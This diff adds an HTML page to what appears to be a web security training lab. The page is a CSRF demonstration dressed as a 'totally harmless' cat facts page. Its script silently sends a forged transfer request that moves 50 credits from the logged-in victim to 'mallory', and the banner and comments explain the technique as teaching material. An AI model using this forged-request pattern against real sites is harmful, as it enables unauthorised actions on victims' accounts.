@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Totally Harmless Page</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>😇 Totally Harmless Cat Facts Page</h1>
+    <a class="home-link" href="/a01/">&larr; Back to A01</a>
+  </header>
+
+  <div class="banner">
+    Variant 10 demo — CSRF (CWE-352). In a real attack this page would live on
+    a completely different domain the attacker controls. Because it's served
+    from the same lab here, the point is purely illustrative — but note that
+    nothing about the exploit below depends on this page belonging to the app;
+    it only depends on the <em>victim's browser</em> already holding the
+    <code>a01_session</code> cookie from a01/index.html.
+  </div>
+
+  <main>
+    <section class="variant">
+      <h2>Did you know?</h2>
+      <p class="desc">Cats sleep for around 70% of their lives. Totally normal page, nothing to see here...</p>
+      <p class="hint">…meanwhile, the invisible image tag below silently fires a GET request that transfers 50 credits from whoever is logged into the A01 lab (e.g. alice) to "mallory" — no click, no confirmation, no CSRF token required.</p>
+      <pre class="out" id="out">Firing forged request…</pre>
+    </section>
+  </main>
+
+  <script>
+    // The classic CSRF delivery mechanism: an <img> tag causes the browser
+    // to issue a GET request to the target origin, automatically attaching
+    // any cookies already stored for that origin (including a01_session) —
+    // no JavaScript execution in the victim's session required at all.
+    const img = new Image();
+    img.onload = () => { document.getElementById('out').textContent = 'Request fired (see A01 screen -> Variant 10 or check mallory\'s balance via /api/a01/account after logging in as mallory).'; };
+    img.onerror = () => { document.getElementById('out').textContent = 'Request fired (image response was not a real image, which is expected — check the transfer result via the API/network tab).'; };
+    img.src = '/api/a01/transfer?to=mallory&amount=50';
+  </script>
+</body>
+</html>
